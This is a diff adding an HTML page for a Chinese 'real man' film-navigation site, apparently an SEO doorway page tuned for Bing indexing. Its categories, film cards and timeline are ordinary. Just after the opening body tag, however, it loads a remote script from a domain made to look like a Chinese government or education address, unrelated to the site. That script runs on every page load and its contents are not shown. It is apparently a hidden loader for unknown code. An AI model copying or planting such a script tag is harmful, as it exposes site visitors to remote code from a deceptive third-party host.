@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>好男人电影网 - 男性电影导航·硬汉片单·成长与悬疑动作</title>
+<meta name="description" content="好男人电影网：为成熟观众准备的电影导航与高清片单，硬汉动作、男性成长、悬疑犯罪、体育励志、历史传记全覆盖，移动端自适应，适合必应收录。">
+<meta name="keywords" content="好男人电影网,男性电影,硬汉片单,成长电影,悬疑动作,体育励志,历史传记,电影导航">
+<meta name="author" content="好男人电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://nanrendianyingwang-h5.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="好男人电影网 - 男性电影导航">
+<meta property="og:description" content="好男人电影网：硬汉、成长、悬疑、体育、历史，男人下班看什么一目了然。">
+<meta property="og:url" content="https://nanrendianyingwang-h5.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#0c1626">
+<style>
+:root{
+  --hm-bg:#0c1626;--hm-panel:#10243f;--hm-card:#16304f;--hm-brown:#b5651d;--hm-brown2:#d98a3d;
+  --hm-cream:#f5efe6;--hm-text:#eae3d6;--hm-muted:#9fb0c3;--hm-line:rgba(181,101,29,.32);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--hm-bg);color:var(--hm-text);line-height:1.7;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.box{max-width:1180px;margin:0 auto;padding:0 16px}
+
+.hm-top{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(12,22,38,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--hm-line)}
+.hm-bar{display:flex;align-items:center;justify-content:space-between;height:58px}
+.hm-logo{font-size:20px;font-weight:900}
+.hm-logo b{color:var(--hm-brown2)}
+.hm-logo i{color:var(--hm-muted);font-style:normal;font-size:12px;margin-left:6px}
+.hm-nav{display:flex;gap:4px;list-style:none}
+.hm-nav a{padding:8px 12px;border-radius:8px;font-size:14px;color:var(--hm-muted);min-height:36px;display:inline-flex;align-items:center}
+.hm-nav a:hover,.hm-nav a.active{color:var(--hm-brown2);background:rgba(181,101,29,.14)}
+.hm-burger{display:none;background:none;border:0;font-size:22px;color:var(--hm-brown2);cursor:pointer;padding:8px}
+
+.hm-hero{margin-top:58px;padding:54px 0 44px;background:radial-gradient(120% 120% at 85% 0%,rgba(217,138,61,.18),transparent 55%),radial-gradient(120% 120% at 5% 100%,rgba(16,36,63,.9),transparent 60%)}
+.hm-hero h1{font-size:clamp(28px,5vw,44px);font-weight:900;line-height:1.15;margin-bottom:12px}
+.hm-hero h1 em{color:var(--hm-brown2);font-style:normal}
+.hm-hero h1 span{color:var(--hm-cream)}
+.hm-hero p{color:var(--hm-muted);max-width:640px;font-size:15px;margin-bottom:18px}
+.hm-search{display:flex;gap:10px;max-width:680px}
+.hm-search input{flex:1;min-height:46px;padding:0 16px;border-radius:12px;border:1px solid var(--hm-line);background:#081120;color:#fff;font-size:15px}
+.hm-search button{min-height:46px;padding:0 22px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--hm-brown),var(--hm-brown2));color:#1a1206;font-weight:900;cursor:pointer}
+.hm-search button:hover{filter:brightness(1.05)}
+.hm-tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.hm-tags span{font-size:13px;padding:5px 12px;border:1px solid var(--hm-line);border-radius:99px;color:var(--hm-muted);cursor:pointer}
+.hm-tags span:hover{color:var(--hm-brown2);border-color:var(--hm-brown2)}
+
+.hm-section{padding:52px 0}
+.hm-head{display:flex;align-items:center;gap:12px;margin-bottom:26px;flex-wrap:wrap}
+.hm-head .no{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--hm-brown),var(--hm-brown2));color:#1a1206;font-weight:900;display:flex;align-items:center;justify-content:center}
+.hm-head h2{font-size:clamp(20px,3vw,28px);font-weight:900}
+.hm-head .d{margin-left:auto;font-size:13px;color:var(--hm-muted)}
+
+.hm-cats{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.hm-cat{background:var(--hm-card);border:1px solid var(--hm-line);border-radius:14px;padding:20px;transition:.3s}
+.hm-cat:hover{transform:translateY(-3px);border-color:var(--hm-brown2);box-shadow:0 10px 26px rgba(181,101,29,.14)}
+.hm-cat .ic{font-size:26px;margin-bottom:8px}
+.hm-cat h4{font-size:16px;margin-bottom:4px}
+.hm-cat span{font-size:12px;color:var(--hm-muted)}
+
+.hm-wall{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.hm-card{background:var(--hm-card);border:1px solid var(--hm-line);border-radius:16px;overflow:hidden;transition:.3s}
+.hm-card:hover{transform:translateY(-4px);border-color:var(--hm-brown2);box-shadow:0 14px 30px rgba(181,101,29,.14)}
+.hm-cover{aspect-ratio:16/9;background:linear-gradient(135deg,var(--hm-panel),#1c3a5e);display:flex;align-items:flex-end;padding:16px;position:relative}
+.hm-cover h3{color:#fff;font-size:18px}
+.hm-cover .badge{position:absolute;top:12px;right:12px;font-size:11px;padding:3px 10px;border-radius:99px;background:rgba(217,138,61,.22);color:var(--hm-brown2);font-weight:700}
+.hm-card .body{padding:14px 16px}
+.hm-card .body p{font-size:13px;color:var(--hm-muted);margin:6px 0 10px}
+.hm-stars{color:var(--hm-brown2);font-size:14px;letter-spacing:2px}
+.hm-stars small{color:var(--hm-muted);margin-left:6px;letter-spacing:0}
+
+.hm-axis{position:relative;border-left:2px solid var(--hm-line);margin-left:8px;padding-left:20px;display:grid;gap:18px}
+.hm-node{background:var(--hm-card);border:1px solid var(--hm-line);border-radius:12px;padding:16px}
+.hm-node .yr{font-size:13px;color:var(--hm-brown2);font-weight:800;margin-bottom:4px}
+.hm-node h4{font-size:16px;margin-bottom:4px}
+.hm-node p{font-size:13px;color:var(--hm-muted)}
+
+.hm-about{background:var(--hm-card);border:1px solid var(--hm-line);border-radius:18px;padding:32px;text-align:center}
+.hm-about h3{font-size:20px;color:var(--hm-brown2);margin-bottom:12px}
+.hm-about p{color:var(--hm-muted);font-size:14px;max-width:660px;margin:0 auto 16px}
+.hm-chips{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.hm-chips span{font-size:13px;padding:6px 14px;border:1px solid var(--hm-line);border-radius:99px;color:var(--hm-muted)}
+
+.hm-foot{background:#081120;color:var(--hm-muted);padding:30px 0;text-align:center;font-size:13px}
+.hm-foot a{color:var(--hm-muted)}
+.hm-foot a:hover{color:var(--hm-brown2)}
+
+@media(max-width:900px){.hm-cats{grid-template-columns:repeat(3,1fr)}.hm-wall{grid-template-columns:1fr 1fr}}
+@media(max-width:620px){
+  .hm-nav{position:fixed;top:58px;left:0;right:0;flex-direction:column;background:var(--hm-bg);padding:14px;border-bottom:1px solid var(--hm-line);transform:translateY(-130%);transition:.3s}
+  .hm-nav.open{transform:none}
+  .hm-burger{display:block}
+  .hm-cats,.hm-wall{grid-template-columns:1fr}
+  .hm-search{flex-direction:column}
+  .hm-search button{width:100%}
+}
+.reveal{opacity:0;transform:translateY(18px);transition:.6s ease}
+.reveal.in{opacity:1;transform:none}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="hm-top">
+  <div class="box hm-bar">
+    <div class="hm-logo">好男人<b>电影网</b><i>REAL MAN FILM</i></div>
+    <button class="hm-burger" id="hmBurger" aria-label="菜单">☰</button>
+    <ul class="hm-nav" id="hmNav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#cats">男频栏目</a></li>
+      <li><a href="#list">男人片单</a></li>
+      <li><a href="#axis">影史时间轴</a></li>
+      <li><a href="#about">关于好男人</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+  <section class="hm-hero" id="home">
+    <div class="box">
+      <h1>好男人电影网<br>男人下班看什么：<em>硬汉</em>、<span>成长、悬疑、燃片</span></h1>
+      <p>好男人电影网做正经电影导航：不擦边、不低俗，只收硬汉动作、男性成长、悬疑犯罪、体育励志、历史传记。移动端自适应，内链占位，适合必应收录。</p>
+      <form class="hm-search" onsubmit="return false">
+        <input type="search" placeholder="搜：教父 / 肖申克 / 激战 / 盗火线 / 1917…" aria-label="电影搜索">
+        <button type="submit">找片</button>
+      </form>
+      <div class="hm-tags">
+        <span>硬汉动作</span><span>男性成长</span><span>悬疑犯罪</span><span>体育励志</span><span>历史传记</span><span>战争群像</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="hm-section" id="cats">
+    <div class="box">
+      <div class="hm-head reveal"><div class="no">1</div><h2>男频栏目</h2><span class="d">5 类男人爱看</span></div>
+      <div class="hm-cats">
+        <div class="hm-cat reveal"><div class="ic">🔫</div><h4>硬汉动作</h4><span>枪战 / 搏斗 / 孤胆</span></div>
+        <div class="hm-cat reveal"><div class="ic">🧗</div><h4>男性成长</h4><span>逆袭 / 中年 / 父子</span></div>
+        <div class="hm-cat reveal"><div class="ic">🕵️</div><h4>悬疑犯罪</h4><span>追凶 / 黑帮 / 反转</span></div>
+        <div class="hm-cat reveal"><div class="ic">🥊</div><h4>体育励志</h4><span>拳击 / 足球 / 跑者</span></div>
+        <div class="hm-cat reveal"><div class="ic">🏛️</div><h4>历史传记</h4><span>战争 / 权谋 / 真事</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="hm-section" id="list" style="background:#0a1322">
+    <div class="box">
+      <div class="hm-head reveal"><div class="no">2</div><h2>男人片单</h2><span class="d">成熟观众精选</span></div>
+      <div class="hm-wall">
+        <article class="hm-card reveal">
+          <div class="hm-cover"><span class="badge">9.3</span><h3>肖申克的救赎</h3></div>
+          <div class="body"><p>欧美 / 成长 / 1994 / 希望与自由</p><div class="hm-stars">★★★★★ <small>9.3 分</small></div></div>
+        </article>
+        <article class="hm-card reveal">
+          <div class="hm-cover"><span class="badge">9.2</span><h3>教父</h3></div>
+          <div class="body"><p>欧美 / 黑帮 / 1972 / 家族与权力</p><div class="hm-stars">★★★★★ <small>9.2 分</small></div></div>
+        </article>
+        <article class="hm-card reveal">
+          <div class="hm-cover"><span class="badge">8.9</span><h3>激战</h3></div>
+          <div class="body"><p>港片 / 体育 / 2013 / 拳台与中年重生</p><div class="hm-stars">★★★★☆ <small>8.9 分</small></div></div>
+        </article>
+        <article class="hm-card reveal">
+          <div class="hm-cover"><span class="badge">9.0</span><h3>盗火线</h3></div>
+          <div class="body"><p>欧美 / 犯罪 / 1995 / 警匪双雄</p><div class="hm-stars">★★★★★ <small>9.0 分</small></div></div>
+        </article>
+        <article class="hm-card reveal">
+          <div class="hm-cover"><span class="badge">8.7</span><h3>1917</h3></div>
+          <div class="body"><p>英美 / 战争 / 2019 / 一镜到底送信</p><div class="hm-stars">★★★★☆ <small>8.7 分</small></div></div>
+        </article>
+        <article class="hm-card reveal">
+          <div class="hm-cover"><span class="badge">8.8</span><h3>摔跤吧！爸爸</h3></div>
+          <div class="body"><p>印度 / 体育 / 2016 / 父女与金牌</p><div class="hm-stars">★★★★☆ <small>8.8 分</small></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="hm-section" id="axis">
+    <div class="box">
+      <div class="hm-head reveal"><div class="no">3</div><h2>男人影史时间轴</h2><span class="d">从硬汉片到成长片</span></div>
+      <div class="hm-axis">
+        <div class="hm-node reveal"><div class="yr">1972</div><h4>教父</h4><p>黑帮史诗开局，男性权力与家族责任的天花板。</p></div>
+        <div class="hm-node reveal"><div class="yr">1994</div><h4>肖申克的救赎</h4><p>男人最该看的不是越狱，是“希望”这两个字。</p></div>
+        <div class="hm-node reveal"><div class="yr">1995</div><h4>盗火线</h4><p>警与匪都有原则，成年男人的孤独与克制。</p></div>
+        <div class="hm-node reveal"><div class="yr">2013</div><h4>激战</h4><p>中年破产、擂台重练，男人重启人生的样本。</p></div>
+        <div class="hm-node reveal"><div class="yr">2019</div><h4>1917</h4><p>战争不是爽片，是“兄弟托我把信送到”的担当。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="hm-section" id="about">
+    <div class="box">
+      <div class="hm-about reveal">
+        <h3>关于好男人电影网</h3>
+        <p>好男人电影网把“男人爱看”做成正经事：硬汉不等于粗鲁，成长不等于鸡汤，悬疑不等于阴暗。本页为静态演示，内链均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+        <div class="hm-chips">
+          <span>硬汉动作</span><span>男性成长</span><span>悬疑犯罪</span><span>体育励志</span><span>历史传记</span><span>必应友好</span>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="hm-foot">
+  <div class="box">
+    <p>© 2026 好男人电影网 · https://nanrendianyingwang-h5.github.io</p>
+    <p style="margin-top:8px"><a href="#">首页</a> · <a href="#">男频栏目</a> · <a href="#">男人片单</a> · <a href="#">影史时间轴</a> · <a href="#">免责声明</a></p>
+  </div>
+</footer>
+
+<button id="hmTop" style="position:fixed;right:16px;bottom:16px;width:44px;height:44px;border-radius:50%;border:1px solid var(--hm-line);background:var(--hm-panel);color:var(--hm-brown2);font-size:20px;cursor:pointer;display:none;z-index:99" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var burger=document.getElementById('hmBurger'),nav=document.getElementById('hmNav');
+  burger.addEventListener('click',function(){nav.classList.toggle('open')});
+  nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open')})});
+
+  var links=nav.querySelectorAll('a'),secs=document.querySelectorAll('main section[id]');
+  window.addEventListener('scroll',function(){
+    var y=window.scrollY+120,cur='home';
+    secs.forEach(function(s){if(s.offsetTop&&y>=s.offsetTop)cur=s.id});
+    links.forEach(function(l){l.classList.toggle('active',l.getAttribute('href')==='#'+cur)});
+  });
+
+  var topBtn=document.getElementById('hmTop');
+  window.addEventListener('scroll',function(){topBtn.style.display=window.scrollY>400?'block':'none'});
+  topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting)e.target.classList.add('in')})},{threshold:.08});
+  document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
+})();
+</script>
+</body>
+</html>
